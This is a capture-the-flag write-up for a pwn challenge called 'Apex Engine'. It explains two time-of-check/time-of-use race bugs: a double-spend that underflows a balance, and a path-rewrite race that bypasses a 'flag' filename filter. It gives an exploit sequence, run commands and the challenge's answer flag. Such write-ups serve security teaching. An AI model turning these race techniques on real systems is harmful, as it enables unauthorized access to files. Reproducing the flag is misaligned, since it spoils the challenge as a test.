# Apex Engine

**Event:** HICyberCon CTF 2026
**Category:** pwn
**Flag:** `hiCTF{t0ct0u_mult1thr34d_r4c3_c0nd1t10n_w1n_8d3f_3c6bd2cbb4}`

---

## Protections
```
RELRO: Full   Stack: Canary   NX: Yes   PIE: Yes   FORTIFY: yes
```
Full RELRO + PIE + canary means no GOT/ret2win path: this is a pure **logic/race** bug.

## Analysis (Ghidra decompile → `main` @0x12c0, and two thread workers)

Globals (`0x43e0+`):
- `0x43e0` balance (u64, starts 100) · `0x43e8` escrow (u64) · `0x43f0` VIP flag (u32) · `0x43f4` "root" word (u32, **never written**)

Menu: 1 view, 2 escrow transfer, 3 withdraw, 4 upgrade VIP (10 000), 5 vault enclave, 6 exit.

### Bug 1 - TOCTOU double-spend (`FUN_00101ef0` settlement worker)
`menu 2` only checks `balance < amount` at submit time, then spawns a detached thread:
```
if (order.status != PENDING) return;
if (order.amount <= balance) {          // checked NOW
    status = PROCESSING; usleep(25000); // 25 ms window
    status = COMPLETED;
    balance -= order.amount;            // deducted LATER
    escrow  += order.amount;
}
```
Because the deduction happens 25 ms after the balance check, submitting **two orders of the
full balance (100) back-to-back** makes both threads pass the check, then both deduct:
`100 - 100 - 100 = 0xFFFFFFFFFFFFFF9C` (unsigned underflow → huge balance). The
"funds cannot be double-spent" risk model is exactly what is broken.

### Bug 2 - TOCTOU file-filter bypass (`FUN_00101d80` enclave stream worker)
Vault is gated behind VIP (`0x43f0`). Once inside, `create slot` (stride 0xb0, path at
`+0x24`), `stream slot` spawns a worker that does:
```
if (strstr(path,"flag") && root_word==0)  -> deny        // filename filter
usleep(25000);                                          // 25 ms window
f = fopen(path,"r");                                    // path read AGAIN (shared buffer)
... fread(0x1ff) ... fwrite(stdout)                     // prints file contents
```
The path buffer is shared with `menu 3 = Edit Document Target Path`, which we can call while
the worker sleeps. So: stream with the benign default target (`"Document_Preview"`, contains
no "flag" → filter passes), then during the 25 ms sleep rewrite the slot path to
`./flag.txt` (or `/flag`). The worker wakes and opens the *new* path → the `flag` filter is
bypassed and the flag is printed.

> Note: `/flag` opens, and on failure `path=="/flag"` falls back to `./flag.txt`; both
> contain "flag", so only the race makes them reachable. The `0x43f4` "root" bypass word is
> dead code - only the race works.

## Exploit (`exploit.py`)
```python
# 1) double-spend underflow
send "2" ; amount 100            # order #0
send "2" ; amount 100            # order #1 (<25 ms later) -> balance underflows
sleep(0.2)
# 2) VIP with the now-huge balance
send "4"
# 3) enter enclave
send "5"
send "1"; slot 0                 # create slot (default target "Document_Preview")
send "2"; slot 0                 # stream -> worker enters 25 ms sleep
send "3"; slot 0; "./flag.txt"   # race: rewrite path while worker sleeps
# 4) read the enclave data stream -> flag
```
Run:
```bash
cd extracted
python3 ../exploit.py                 # local (needs ./flag.txt to exist)
python3 ../exploit.py remote <host> <port>
```

### Local verification (real tool output)
```
cd extracted && printf 'hiCTF{l0c4l_t3st_r4c3_byp4ss_0000}\n' > flag.txt
python3 ../exploit.py
...
================ [SECURE ENCLAVE DATA STREAM] ================
hiCTF{l0c4l_t3st_r4c3_byp4ss_0000}
==============================================================
```
The full chain (double-spend → VIP → enclave → race) executes and the file contents are
streamed to stdout, i.e. the primitive reads `/flag` (or `./flag.txt`) on the target.

## Flag

Running the same chain against the live instance streamed `/flag`:

```
hiCTF{t0ct0u_mult1thr34d_r4c3_c0nd1t10n_w1n_8d3f_3c6bd2cbb4}
```
